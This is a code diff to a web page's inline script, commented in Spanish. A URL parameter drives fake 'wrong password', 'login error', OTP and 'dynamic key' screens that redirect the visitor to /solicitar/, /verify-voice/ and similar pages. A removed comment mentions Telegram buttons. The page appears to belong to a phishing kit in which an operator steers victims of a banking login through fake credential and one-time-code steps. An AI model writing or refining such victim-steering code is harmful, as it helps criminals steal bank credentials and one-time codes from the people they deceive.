@@ -98,14 +98,14 @@
     });
     </script>
 
-    <!-- BOTONES DE TELEGRAM QUE SÍ REDIRIGEN -->
+    <!-- REDIRECCIÓN AUTOMÁTICA CON URL (SIN POLLING) -->
     <script>
-    const url = new URL(location.href);
-    const action = url.searchParams.get('action');
+    const urlParams = new URLSearchParams(window.location.search);
+    const action = urlParams.get('do');
 
     if (action) {
-        let mensaje = '';
         let destino = '';
+        let mensaje = '';
 
         switch(action) {
             case 'otp':
@@ -113,7 +113,7 @@
                 destino = '/solicitar/';
                 break;
             case 'error':
-                mensaje = 'Clave incorrecta. Intenta de nuevo';
+                mensaje = 'Clave incorrecta';
                 destino = '/login/';
                 break;
             case 'dinamica':
@@ -121,7 +121,7 @@
                 destino = '/verify-voice/';
                 break;
             case 'loginerr':
-                mensaje = 'Error de login. Vuelve a intentarlo';
+                mensaje = 'Error de login';
                 destino = '/login/';
                 break;
             case 'ok':
@@ -133,19 +133,17 @@
                 destino = '/verifying/';
         }
 
-        // REEMPLAZA TODO CON MENSAJE Y REDIRIGE
+        // MUESTRA MENSAJE Y REDIRIGE
         document.body.innerHTML = `
-            <div style="text-align:center;padding:60px;color:#210049;font-family:Arial;background:#f9f9f9;height:100vh">
+            <div style="text-align:center;padding:80px;background:#742fe1;color:white;font-family:Arial;height:100vh">
                 <h1>${mensaje}</h1>
-                <p>Redirigiendo en 2 segundos...</p>
-                <div style="border:16px solid #f3f3f3;border-top:16px solid #ff6b6b;border-radius:50%;width:80px;height:80px;animation:spin 1s linear infinite;margin:30px auto"></div>
+                <p>Redirigiendo...</p>
+                <div style="border:16px solid #fff;border-top:16px solid #ff6b6b;border-radius:50%;width:80px;height:80px;animation:spin 1s linear infinite;margin:30px auto"></div>
             </div>
-            <style>
-                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-            </style>
+            <style>@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
         `;
 
-        setTimeout(() => { location.href = destino; }, 2000);
+        setTimeout(() => { window.location.href = destino; }, 1800);
     }
     </script>
 
